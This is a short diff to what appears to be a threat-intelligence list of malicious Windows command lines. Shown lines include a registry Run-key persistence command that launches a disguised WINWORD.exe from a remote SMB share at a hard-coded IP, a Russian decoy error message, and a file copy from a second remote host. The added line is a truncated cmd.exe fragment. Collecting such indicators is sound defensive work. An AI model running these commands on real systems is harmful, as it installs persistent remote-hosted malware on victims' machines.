@@ -261,5 +261,7 @@ hostname
 \\document-cdn.org\Microsoft Office Word$\WINWORD.exe
 cmd.exe /c start "" reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft Office Word" /t REG_SZ /d "\\94.156.8.166\Microsoft Office Word$\WINWORD.exe" /f & start "" msg * Произошла ошибка при открытии данного документа. Файл повреждене и не может быть восстановлен & start "" xcopy "\\79.132.128.47\image.jpg" "\" /Y
 
+cmd.exe" /v /c set "k=%cd%\19_09_2024.msc"&(IF NOT EXIST "!k!" (for /f "tokens=* usebackq"))
+
 # Do not remove the line
 
